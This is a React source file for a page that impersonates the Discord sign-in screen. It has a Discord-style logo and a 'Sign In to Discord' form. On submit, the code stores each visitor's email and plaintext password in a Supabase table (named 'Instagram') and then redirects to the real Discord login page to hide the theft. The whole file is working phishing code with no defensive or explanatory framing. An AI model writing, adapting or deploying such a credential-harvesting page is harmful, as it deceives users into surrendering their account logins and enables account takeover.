import React, { useState } from "react";
import "./DiscordLogin.css";
import { supabase } from "../../supabase";

const DiscordLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://discord.com/login";
    }
  };

  return (
    <div className="discord-login-bg">
      <div className="discord-login-center">
        <div className="discord-logo-svg">
          <svg width="60" height="60" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg"><circle cx="30" cy="30" r="30" fill="#5865F2"/><path d="M41.5 40c-2.5 1-5.2 1.5-8.5 1.5s-6-0.5-8.5-1.5c-0.5-0.2-0.7-0.7-0.5-1.2l1.2-2.7c0.2-0.5 0.7-0.7 1.2-0.5 2.2 0.9 4.6 1.4 7.1 1.4s4.9-0.5 7.1-1.4c0.5-0.2 1 0 1.2 0.5l1.2 2.7c0.2 0.5 0 1-0.5 1.2z" fill="#fff"/></svg>
        </div>
        <div className="discord-login-box">
          <h1 className="discord-signin-title">Sign In to Discord</h1>
          <form className="discord-login-form" onSubmit={handleSubmit}>
            <input
              type="text"
              className="discord-login-input"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              className="discord-login-input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" className="discord-login-btn" disabled={loading}>
              {loading ? "Signing in..." : "Sign In"}
            </button>
            {error && <div className="discord-error">{error}</div>}
            {success && <div className="discord-success">Login saved!</div>}
          </form>
          <div className="discord-signup-now">
            New to Discord?{' '}
            <a
              href="https://discord.com/register"
              target="_blank"
              rel="noopener noreferrer"
            >
              Sign up now.
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DiscordLogin;
